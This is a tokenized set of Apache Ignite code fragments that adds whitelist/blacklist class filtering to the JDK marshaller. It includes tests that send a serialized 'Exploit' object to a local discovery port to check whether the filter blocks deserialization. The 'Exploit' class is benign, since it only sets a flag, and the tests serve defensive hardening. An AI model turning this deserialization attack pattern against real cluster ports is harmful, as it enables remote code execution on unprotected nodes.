";", "}", "}", "try", "(", "BufferedReader", "reader", "=", "new", "BufferedReader", "(", "new", "InputStreamReader", "(", "is", ")", "))", "{", "String", "line", ";", "for", "(", "int", "i", "=", "1", ";", "(", "line", "=", "reader", ".", "readLine", "(", "))", "!", "=", "null", ";", "i", "+", "+)", "{", "String", "s", "=", "line", ".", "trim", "(", ");", "if", "(", "!", "s", ".", "isEmpty", "(", ")", "&", "&", "s", ".", "charAt", "(", "0", ")", "!", "=", "'", "#'", "&", "&", "s", ".", "charAt", "(", "0", ")", "!", "=", "'", "['", ")", "{", "try", "{", "clsSet", ".", "add", "(", "s", ")", ";", "}", "catch", "(", "IllegalArgumentException", "e", ")", "{", "throw", "new", "IgniteCheckedException", "(", "\"", "Exception", "occurred", "while", "reading", "list", "of", "classes", "\"", "\"", "[", "path", "=", "\"", "+", "fileName", "+", "\"", ",", "row", "=", "\"", "+", "i", "+", "\"", ",", "line", "=", "\"", "+", "s", "+", "'", "]'", ",", "e", ")", ";", "}", "}", "}", "}", "catch", "(", "IOException", "e", ")", "{", "throw", "new", "IgniteCheckedException", "(", "\"", "Exception", "occurred", "while", "reading", "and", "creating", "list", "of", "classes", "\"", "\"", "[", "path", "=", "\"", "+", "fileName", "+", "'", "]'", ",", "e", ")", ";", "}", "}", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "MarshallerUtils", ".", "CLS_NAMES_FILE", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "MarshallerUtils", ".", "JDK_CLS_NAMES_FILE", ";", "/", "**", "Class", "name", "filter", ".", "*", "/", "private", "final", "IgnitePredicate", "<", "String", ">", "clsFilter", ";", "/", "**", "JDK", "marshaller", ".", "*", "/", "private", "final", "JdkMarshaller", "jdkMarsh", ";", "public", "MarshallerContextImpl", "(", "@", "Nullable", "Collection", "<", "PluginProvider", ">", "plugins", ",", "IgnitePredicate", "<", "String", ">", "clsFilter", ")", "{", "this", ".", "clsFilter", "=", "clsFilter", ";", "this", ".", "jdkMarsh", "=", "new", "JdkMarshaller", "(", "clsFilter", ")", ";", "return", "U", ".", "forName", "(", "clsName", ",", "ldr", ",", "clsFilter", ")", ";", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "public", "IgnitePredicate", "<", "String", ">", "classNameFilter", "(", ")", "{", "return", "clsFilter", ";", "}", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "public", "JdkMarshaller", "jdkMarshaller", "(", ")", "{", "return", "jdkMarsh", ";", "}", "super", "(", "null", ",", "null", ")", ";", "super", "(", "plugins", ",", "null", ")", ";", "return", "ctx", ".", "jdkMarshaller", "(", ").", "unmarshal", "(", "this", ",", "clsLdr", ")", ";", "classDescriptor", "(", "clsMap", ",", "U", ".", "forName", "(", "readUTF", "(", "),", "clsLdr", ",", "ctx", ".", "classNameFilter", "(", "))", ",", "ctx", ",", "mapper", ")", ":", "ctx", ".", "jdkMarshaller", "(", ").", "marshal", "(", "obj", ",", "this", ")", ";", "this", ".", "marshallerCtx", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "marsh", ".", "setContext", "(", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ");", "private", "final", "Marshaller", "marsh", ";", "this", "(", "routerClient", ",", "new", "JdkMarshaller", "(", "))", ";", "}", "/", "**", "*", "@", "param", "routerClient", "Router", "client", "flag", ".", "*", "@", "param", "marsh", "Marshaller", ".", "*", "/", "public", "GridTcpRestParser", "(", "boolean", "routerClient", ",", "Marshaller", "marsh", ")", "{", "this", ".", "marsh", "=", "marsh", ";", "return", "U", ".", "unmarshal", "(", "marsh", ",", "bytes", ",", "null", ")", ";", "U", ".", "marshal", "(", "marsh", ",", "obj", ",", "out", ")", ";", "GridNioParser", "parser", "=", "new", "GridTcpRestParser", "(", "false", ",", "ctx", ".", "marshallerContext", "(", ").", "jdkMarshaller", "(", "))", ";", "return", "U", ".", "forName", "(", "clsName", ",", "ldr", ",", "null", ")", ";", "}", "/", "**", "*", "Gets", "class", "for", "provided", "name", ".", "Accepts", "primitive", "types", "names", ".", "*", "*", "@", "param", "clsName", "Class", "name", ".", "*", "@", "param", "ldr", "Class", "loader", ".", "*", "@", "return", "Class", ".", "*", "@", "throws", "ClassNotFoundException", "If", "class", "not", "found", ".", "*", "/", "public", "static", "Class", "<", "?>", "forName", "(", "String", "clsName", ",", "@", "Nullable", "ClassLoader", "ldr", ",", "IgnitePredicate", "<", "String", ">", "clsFilter", ")", "throws", "ClassNotFoundException", "{", "if", "(", "clsFilter", "!", "=", "null", "&", "&", "!", "clsFilter", ".", "apply", "(", "clsName", ")", ")", "throw", "new", "RuntimeException", "(", "\"", "Deserialization", "of", "class", "\"", "+", "clsName", "+", "\"", "is", "disallowed", ".", "\")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "/", "**", "*", "Returns", "class", "name", "filter", ".", "*", "*", "@", "return", "Class", "name", "filter", ".", "*", "/", "public", "IgnitePredicate", "<", "String", ">", "classNameFilter", "(", ");", "/", "**", "*", "Returns", "JDK", "marshaller", "instance", ".", "*", "/", "public", "JdkMarshaller", "jdkMarshaller", "(", ");", "/", "**", "Jdk", "class", "names", "file", ".", "*", "/", "public", "static", "final", "String", "JDK_CLS_NAMES_FILE", "=", "\"", "META", "-", "INF", "/", "classnames", "-", "jdk", ".", "properties", "\"", ";", "/", "**", "Class", "names", "file", ".", "*", "/", "public", "static", "final", "String", "CLS_NAMES_FILE", "=", "\"", "META", "-", "INF", "/", "classnames", ".", "properties", "\"", ";", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "/", "**", "Class", "name", "filter", ".", "*", "/", "private", "final", "IgnitePredicate", "<", "String", ">", "clsFilter", ";", "/", "**", "*", "Default", "constructor", ".", "*", "/", "public", "JdkMarshaller", "(", ")", "{", "this", "(", "null", ")", ";", "}", "/", "**", "*", "@", "param", "clsFilter", "Class", "name", "filter", ".", "*", "/", "public", "JdkMarshaller", "(", "IgnitePredicate", "<", "String", ">", "clsFilter", ")", "{", "this", ".", "clsFilter", "=", "clsFilter", ";", "}", "objIn", "=", "new", "JdkMarshallerObjectInputStream", "(", "new", "JdkMarshallerInputStreamWrapper", "(", "in", ")", ",", "clsLdr", ",", "clsFilter", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "/", "**", "Class", "name", "filter", ".", "*", "/", "private", "final", "IgnitePredicate", "<", "String", ">", "clsFilter", ";", "JdkMarshallerObjectInputStream", "(", "InputStream", "in", ",", "ClassLoader", "clsLdr", ",", "IgnitePredicate", "<", "String", ">", "clsFilter", ")", "throws", "IOException", "{", "this", ".", "clsFilter", "=", "clsFilter", ";", "return", "U", ".", "forName", "(", "desc", ".", "getName", "(", "),", "clsLdr", ",", "clsFilter", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "IgniteKernal", ";", "private", "Marshaller", "marsh", ";", "if", "(", "ignite", "instanceof", "IgniteKernal", ")", "/", "/", "IgniteMock", "instance", "can", "be", "injected", "from", "tests", ".", "marsh", "=", "(", "(", "IgniteKernal", ")", "ignite", ")", ".", "context", "(", ").", "marshallerContext", "(", ").", "jdkMarshaller", "(", ");", "else", "marsh", "=", "new", "JdkMarshaller", "(", ");", "protected", "Ignite", "ignite", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "IgniteKernal", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "private", "class", "DefaultConverter", "<", "T", ">", "implements", "SocketMessageConverter", "<", "T", ">", "{", "marsh", "=", "new", "JdkMarshaller", "(", "((", "IgniteKernal", ")", "ignite", ")", ".", "context", "(", ").", "marshallerContext", "(", ").", "classNameFilter", "(", "))", ";", "MarshallerUtils", ".", "setNodeName", "(", "marsh", ",", "igniteInstanceName", ")", ";", "#", "#", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "#", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "#", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "#", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "#", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "#", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "#", "#", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "#", "#", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "#", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "#", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "#", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "#", "limitations", "under", "the", "License", ".", "#", "#", "Intentionally", "empty", ".", "#", "#", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "#", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "#", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "#", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "#", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "#", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "#", "#", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "#", "#", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "#", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "#", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "#", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "#", "limitations", "under", "the", "License", ".", "#", "org", ".", "apache", ".", "ignite", ".", "spi", ".", "discovery", ".", "tcp", ".", "DiscoveryUnmarshalVulnerabilityTest", "$", "Exploit", "org", ".", "apache", ".", "ignite", ".", "stream", ".", "socket", ".", "SocketStreamerUnmarshalVulnerabilityTest", "$", "Exploit", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "ignite", ".", "internal", ";", "import", "junit", ".", "framework", ".", "TestCase", ";", "/", "**", "*", "Tests", "for", "{", "@", "link", "ClassSet", "}", "class", ".", "*", "/", "public", "class", "ClassSetTest", "extends", "TestCase", "{", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testAddAndContains", "(", ")", "throws", "Exception", "{", "ClassSet", "clsSet", "=", "new", "ClassSet", "(", ");", "clsSet", ".", "add", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignite", "\"", ");", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignite", "\"", "))", ";", "assertFalse", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "NotIgnite", "\"", "))", ";", "assertFalse", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "Ignite", "\"", "))", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testAddWithMaskAndContains", "(", ")", "throws", "Exception", "{", "ClassSet", "clsSet", "=", "new", "ClassSet", "(", ");", "clsSet", ".", "add", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "*\"", ");", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignite", "\"", "))", ";", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "NotIgnite", "\"", "))", ";", "assertFalse", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "Ignite", "\"", "))", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testReduceOnAddWithMask", "(", ")", "throws", "Exception", "{", "ClassSet", "clsSet", "=", "new", "ClassSet", "(", ");", "clsSet", ".", "add", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignite", "\"", ");", "clsSet", ".", "add", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignition", "\"", ");", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignite", "\"", "))", ";", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignition", "\"", "))", ";", "assertFalse", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "NotIgnite", "\"", "))", ";", "clsSet", ".", "add", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "*\"", ");", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignite", "\"", "))", ";", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "Ignition", "\"", "))", ";", "assertTrue", "(", "clsSet", ".", "contains", "(", "\"", "org", ".", "apache", ".", "ignite", ".", "NotIgnite", "\"", "))", ";", "}", "}", "MarshallerContextImpl", "marshallerContext", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "public", "IgnitePredicate", "<", "String", ">", "classNameFilter", "(", ")", "{", "return", "null", ";", "}", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "public", "JdkMarshaller", "jdkMarshaller", "(", ")", "{", "return", "new", "JdkMarshaller", "(", ");", "}", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgnitePredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "@", "Override", "public", "IgnitePredicate", "<", "String", ">", "classNameFilter", "(", ")", "{", "return", "null", ";", "}", "@", "Override", "public", "JdkMarshaller", "jdkMarshaller", "(", ")", "{", "return", "new", "JdkMarshaller", "(", ");", "}", "MarshallerContextImpl", "marshCtx", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "MarshallerContextImpl", "marshCtx", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "MarshallerContextImpl", "ctx", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "MarshallerContextImpl", "ctx", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "MarshallerContextImpl", "ctx", "=", "new", "MarshallerContextImpl", "(", "null", ",", "null", ")", ";", "super", "(", "plugins", ",", "null", ")", ";", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "ignite", ".", "spi", ".", "discovery", ".", "tcp", ";", "import", "java", ".", "io", ".", "BufferedOutputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "ObjectInputStream", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "io", ".", "Serializable", ";", "import", "java", ".", "net", ".", "InetAddress", ";", "import", "java", ".", "net", ".", "Socket", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicBoolean", ";", "import", "org", ".", "apache", ".", "ignite", ".", "IgniteCheckedException", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "IgniteUtils", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "lang", ".", "GridAbsPredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "typedef", ".", "internal", ".", "U", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "import", "org", ".", "apache", ".", "ignite", ".", "testframework", ".", "GridTestUtils", ";", "import", "org", ".", "apache", ".", "ignite", ".", "testframework", ".", "junits", ".", "common", ".", "GridCommonAbstractTest", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "IgniteSystemProperties", ".", "IGNITE_MARSHALLER_BLACKLIST", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "IgniteSystemProperties", ".", "IGNITE_MARSHALLER_WHITELIST", ";", "/", "**", "*", "Tests", "for", "whitelist", "and", "blacklist", "ot", "avoiding", "deserialization", "vulnerability", ".", "*", "/", "public", "class", "DiscoveryUnmarshalVulnerabilityTest", "extends", "GridCommonAbstractTest", "{", "/", "**", "Marshaller", ".", "*", "/", "private", "static", "final", "JdkMarshaller", "MARSH", "=", "new", "JdkMarshaller", "(", ");", "/", "**", "Shared", "value", ".", "*", "/", "private", "static", "final", "AtomicBoolean", "SHARED", "=", "new", "AtomicBoolean", "(", ");", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "protected", "void", "beforeTest", "(", ")", "throws", "Exception", "{", "super", ".", "beforeTest", "(", ");", "SHARED", ".", "set", "(", "false", ")", ";", "System", ".", "clearProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ")", ";", "System", ".", "clearProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ")", ";", "IgniteUtils", ".", "clearClassCache", "(", ");", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testNoLists", "(", ")", "throws", "Exception", "{", "testExploit", "(", "true", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testWhiteListIncluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_included", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ",", "path", ")", ";", "testExploit", "(", "true", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testWhiteListExcluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_excluded", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ",", "path", ")", ";", "testExploit", "(", "false", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testBlackListIncluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_included", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ",", "path", ")", ";", "testExploit", "(", "false", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testBlackListExcluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_excluded", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ",", "path", ")", ";", "testExploit", "(", "true", ")", ";", "}", "/", "**", "*", "@", "throws", "Exception", "If", "failed", ".", "*", "/", "public", "void", "testBothListIncluded", "(", ")", "throws", "Exception", "{", "String", "path", "=", "U", ".", "resolveIgnitePath", "(", "\"", "modules", "/", "core", "/", "src", "/", "test", "/", "config", "/", "class_list_exploit_included", ".", "txt", "\"", ").", "getPath", "(", ");", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ",", "path", ")", ";", "System", ".", "setProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ",", "path", ")", ";", "testExploit", "(", "false", ")", ";", "}", "/", "**", "*", "@", "param", "positive", "Positive", ".", "*", "/", "private", "void", "testExploit", "(", "boolean", "positive", ")", "throws", "Exception", "{", "try", "{", "startGrid", "(", ");", "attack", "(", "marshal", "(", "new", "Exploit", "(", "))", ");", "boolean", "res", "=", "GridTestUtils", ".", "waitForCondition", "(", "new", "GridAbsPredicate", "(", ")", "{", "@", "Override", "public", "boolean", "apply", "(", ")", "{", "return", "SHARED", ".", "get", "(", ");", "}", "}", ",", "3000L", ")", ";", "if", "(", "positive", ")", "assertTrue", "(", "res", ")", ";", "else", "assertFalse", "(", "res", ")", ";", "}", "finally", "{", "stopAllGrids", "(", ");", "}", "}", "/", "**", "*", "@", "param", "obj", "Object", ".", "*", "/", "private", "static", "byte", "[", "]", "marshal", "(", "Object", "obj", ")", "throws", "IgniteCheckedException", "{", "return", "MARSH", ".", "marshal", "(", "obj", ")", ";", "}", "/", "**", "*", "@", "param", "data", "Data", ".", "*", "/", "private", "void", "attack", "(", "byte", "[", "]", "data", ")", "throws", "IOException", "{", "InetAddress", "addr", "=", "InetAddress", ".", "getLoopbackAddress", "(", ");", "try", "(", "Socket", "sock", "=", "new", "Socket", "(", "addr", ",", "47500", ")", ";", "OutputStream", "oos", "=", "new", "BufferedOutputStream", "(", "sock", ".", "getOutputStream", "(", "))", ")", "{", "oos", ".", "write", "(", "U", ".", "IGNITE_HEADER", ")", ";", "oos", ".", "write", "(", "data", ")", ";", "}", "}", "/", "**", "*", "/", "private", "static", "class", "Exploit", "implements", "Serializable", "{", "/", "**", "*", "@", "param", "is", "Input", "stream", ".", "*", "/", "private", "void", "readObject", "(", "ObjectInputStream", "is", ")", "throws", "ClassNotFoundException", ",", "IOException", "{", "SHARED", ".", "set", "(", "true", ")", ";", "}", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "222", "@", "@", "/", "*", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "ignite", ".", "stream", ".", "socket", ";", "import", "java", ".", "io", ".", "BufferedOutputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "ObjectInputStream", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "io", ".", "Serializable", ";", "import", "java", ".", "net", ".", "InetAddress", ";", "import", "java", ".", "net", ".", "ServerSocket", ";", "import", "java", ".", "net", ".", "Socket", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "concurrent", ".", "atomic", ".", "AtomicBoolean", ";", "import", "org", ".", "apache", ".", "ignite", ".", "Ignite", ";", "import", "org", ".", "apache", ".", "ignite", ".", "IgniteCheckedException", ";", "import", "org", ".", "apache", ".", "ignite", ".", "IgniteDataStreamer", ";", "import", "org", ".", "apache", ".", "ignite", ".", "IgniteException", ";", "import", "org", ".", "apache", ".", "ignite", ".", "configuration", ".", "IgniteConfiguration", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "IgniteUtils", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "lang", ".", "GridAbsPredicate", ";", "import", "org", ".", "apache", ".", "ignite", ".", "internal", ".", "util", ".", "typedef", ".", "internal", ".", "U", ";", "import", "org", ".", "apache", ".", "ignite", ".", "lang", ".", "IgniteBiTuple", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "Marshaller", ";", "import", "org", ".", "apache", ".", "ignite", ".", "marshaller", ".", "jdk", ".", "JdkMarshaller", ";", "import", "org", ".", "apache", ".", "ignite", ".", "stream", ".", "StreamSingleTupleExtractor", ";", "import", "org", ".", "apache", ".", "ignite", ".", "testframework", ".", "GridTestUtils", ";", "import", "org", ".", "apache", ".", "ignite", ".", "testframework", ".", "junits", ".", "common", ".", "GridCommonAbstractTest", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "IgniteSystemProperties", ".", "IGNITE_MARSHALLER_BLACKLIST", ";", "import", "static", "org", ".", "apache", ".", "ignite", ".", "IgniteSystemProperties", ".", "IGNITE_MARSHALLER_WHITELIST", ";", "/", "**", "*", "Tests", "for", "whitelist", "and", "blacklist", "ot", "avoiding", "deserialization", "vulnerability", ".", "*", "/", "public", "class", "SocketStreamerUnmarshalVulnerabilityTest", "extends", "GridCommonAbstractTest", "{", "/", "**", "Shared", "value", ".", "*", "/", "private", "static", "final", "AtomicBoolean", "SHARED", "=", "new", "AtomicBoolean", "(", ");", "/", "**", "Port", ".", "*", "/", "private", "static", "int", "port", ";", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "protected", "IgniteConfiguration", "getConfiguration", "(", "String", "igniteInstanceName", ")", "throws", "Exception", "{", "try", "(", "ServerSocket", "sock", "=", "new", "ServerSocket", "(", "0", ")", ")", "{", "port", "=", "sock", ".", "getLocalPort", "(", ");", "}", "IgniteConfiguration", "cfg", "=", "super", ".", "getConfiguration", "(", "igniteInstanceName", ")", ";", "cfg", ".", "setCacheConfiguration", "(", "defaultCacheConfiguration", "(", "))", ";", "return", "cfg", ";", "}", "/", "**", "{", "@", "inheritDoc", "}", "*", "/", "@", "Override", "protected", "void", "beforeTest", "(", ")", "throws", "Exception", "{", "super", ".", "beforeTest", "(", ");", "SHARED", ".", "set", "(", "false", ")", ";", "System", ".", "clearProperty", "(", "IGNITE_MARSHALLER_WHITELIST", ")", ";", "System", ".", "clearProperty", "(", "IGNITE_MARSHALLER_BLACKLIST", ")", ";", "IgniteUtils", ".", "clearClassCache", "(", ");", "}", "/", "**", "*", 